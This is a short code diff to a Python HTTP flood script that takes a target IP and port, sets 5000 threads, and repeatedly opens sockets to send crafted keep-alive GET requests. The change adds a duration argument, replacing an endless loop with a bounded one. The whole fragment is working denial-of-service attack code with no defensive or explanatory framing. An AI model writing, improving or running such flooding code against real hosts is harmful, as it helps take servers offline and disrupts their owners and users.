@@ -16497,6 +16497,7 @@ import sys
 
 ip = str(sys.argv[1])
 port = int(sys.argv[2])
+time = int(sys.argv[3])*10
 pack = 65000
 thread = 5000
 def start():
@@ -16510,7 +16511,7 @@ def start():
     length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
     target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
     main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
-    while True:
+    for sequence in range(time):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((str(ip),int(port)))
